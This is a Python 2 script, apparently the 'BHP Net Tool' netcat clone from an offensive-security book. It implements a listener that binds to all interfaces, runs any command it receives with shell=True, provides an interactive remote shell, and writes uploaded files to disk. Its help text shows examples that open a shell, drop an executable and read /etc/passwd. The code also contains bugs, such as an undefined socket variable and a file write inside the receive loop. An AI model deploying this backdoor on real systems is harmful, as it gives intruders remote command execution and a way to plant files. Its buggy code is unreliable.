import sys
import socket
import getopt
import threading
import subprocess

#GLOBAL VARS
listen = False
upload = False
command = False
execute = ""
target = ""
upload_dest = ""
port = 0

#A function to print usage of SimpleNC
def help_menu():
	print("BHP Net Tool\n")
	print("Execution: bhpnet.py -t target_host -p port")
	print("-l --listen\t\t\t\t- listen on [host:port] for incomming connections")
	print("-u --upload=destination\t\t\t- upon receiving a connection upload a file and write to [destination]\n")
	print("-e --execute=file_to_run\t\t- execute the given file upon receiving a connection")
	print("-c --command\t\t\t\t- initialize a command shell")
	print("Examples:")
	print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
	print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
	print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
	print("echo 'jumpan jumpman dem boys up to sumting' | ./bhpnet.py -t 192.168.11.112 -p 135")
	sys.exit(0)

def client_sender(buffer):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		client.connect((target,port))	#try to conect to target host
		if len(buffer):
			client.send(buffer)
		while True:
			recv_len = 1
			response = ""
			while recv_len:
				data = client.recv(4096)
				recv_len = len(data)
				response += data
				if recv_len < 4096:
					break
			print(response),
			buffer = raw_input("")	#wait for more input
			buffer += "\n"
			client.send(buffer)	#send what was collected
	except:
		print("[client] Encoutered an Exception. Exiting.")
		client.close()	#terminate the connection

def server_loop():
	global target
	#if no target listen on al interfaces
	if not len(target):
		target = "0.0.0.0"
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target,port))
	server.listen(5)
	while True:
		client_socket, addr = server.accept()
		client_thread = threading.Thread(target=client_handler, args=(client_socket,))	#create a thread for each client
		client_thread.start()

def client_handler(client_socket):
	global upload
	global execute
	global command

	#upload option
	if len(upload_dest):
		file_buffer = ""
		#read data until there is none
		while True:
			data = client_socket.recv(1024)
			if not data:
				break
			else:
				file_buffer += data
			try:
				file_descriptor = open(upload_dest,"wb")
				file_descriptor.write(file_buffer)
				file_descriptor.close()
				client_socket.send("Successfully saved file to %s\r\n" % upload_dest)	#notify user of successful file write
			except:
				client_sock.send("Failed to save filed to %s\r\n" % upload_dest)
	#command execution option
	if len(execute):
		output = run_command(execute)	#run the command
		client_socket.send(output)
	#shell command option
	if command:
		while True:
			client_socket.send("<BHP:#>")	#simple command shell prompt
			cmd_buffer = ""
			#read until enter command
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)
			response = run_command(cmd_buffer)	#get command output
			client_socket.send(response)	#send back client response

def run_command(command):
	command = command.rstrip()	#trim newline
	#run command and retrieve output
	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
	except:
		output = "Encountered an Exception. Failed to execute the command.\r\n"
	return output 	#send output to client

#MAIN
def main():
	global listen
	global upload
	global command
	global execute
	global target
	global  upload_dest
	global port

	if not len(sys.argv[1:]):
		help_menu()
	#read and parse the arguments passed to SimpleNC
	try:
		opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
	except getopt.GetoptError as err:
		print(str(err))
		help_menu()

	for o,a in opts:
		if o in ("-h", "--help"):
			help_menu()
		elif o in ("-l","--listen"):
			listen = True
		elif o in ("-e","--execute"):
			execute = a
		elif o in ("-c","--commandshell"):
			command = True
		elif o in ("-u","--upload"):
			upload_dest = a
		elif o in ("-t","--target"):
			target = a
		elif o in ("-p","--port"):
			port = int(a)
		else:
			assert False, "Unhandled Option"
	#determine whether listening or reading from stdin
	if not listen and len(target) and port > 0:
		#read in from commandline, crtl-d to end input to stdin
		buffer = sys.stdin.read()
		client_sender(buffer)	#send off data
	#listen to upload things, execute commands and drop a shell back from command line options
	if listen:
		server_loop()
main()
